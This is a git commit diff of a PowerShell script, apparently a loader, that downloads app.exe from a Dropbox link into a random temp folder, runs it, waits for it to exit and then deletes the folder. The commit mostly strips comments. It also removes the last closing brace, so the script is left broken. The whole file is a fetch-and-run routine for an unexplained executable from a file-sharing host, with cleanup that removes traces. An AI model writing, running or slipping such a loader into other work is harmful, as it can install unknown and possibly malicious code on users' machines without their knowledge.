0c546215447372687d03f2ae50ccfa41905053b9
Darkriser0207 <teamvitapupdates@gmail.com>
2025-04-16 12:27:34 +0530

    Update ps_script.ps1

--- ps_script.ps1
+++ ps_script.ps1
@@ -1,14 +1,13 @@
-$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  # Corrected Dropbox URL for direct download
-$tempdir = "$env:TEMP\$(New-Guid)"  # Create a unique temporary directory
+$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  
+$tempdir = "$env:TEMP\$(New-Guid)" 
 mkdir $tempdir | Out-Null
-$file = "$tempdir\app.exe"  # Define the temporary file path
+$file = "$tempdir\app.exe" 
 
 try {
-    irm -Uri $url -OutFile $file -ErrorAction Stop  # Download the file to the temporary directory
-    $proc = Start-Process $file -PassThru -Wait  # Execute the downloaded file
-    Write-Host "Process exited with code: $($proc.ExitCode)"  # Output the process exit code
+    irm -Uri $url -OutFile $file -ErrorAction Stop 
+    $proc = Start-Process $file -PassThru -Wait 
+    Write-Host "Process exited with code: $($proc.ExitCode)"  
 } catch {
-    Write-Error "An error occurred: $_"  # Catch and output any errors that occur
+    Write-Error "An error occurred: $_"  
 } finally {
-    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  # Clean up the temporary directory
-}
+    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  
